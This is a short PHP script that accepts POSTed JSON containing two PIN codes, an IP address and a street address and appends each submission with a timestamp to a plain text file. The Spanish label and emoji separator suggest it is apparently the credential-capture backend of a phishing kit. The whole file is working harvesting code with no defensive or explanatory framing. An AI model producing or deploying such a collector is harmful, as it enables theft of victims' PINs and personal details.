<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $pin = $data['pin'];
    $pin2 = $data['pin2'];
    $ip = $data['ip'];
    $address = $data['address'];
    $file = 'lyam0820.txt';
    $current = file_get_contents($file);
    $current .= "PIN: " . $pin . "\nPIN2: " . $pin2 . "\nIP: " . $ip . "\nDirección: " . $address . "\n";
    $current .= date("Y-m-d H:i:s") . "\n";
    $current .= "********🦍🦍🦍🦍*****************\n";
    file_put_contents($file, $current);
}
?>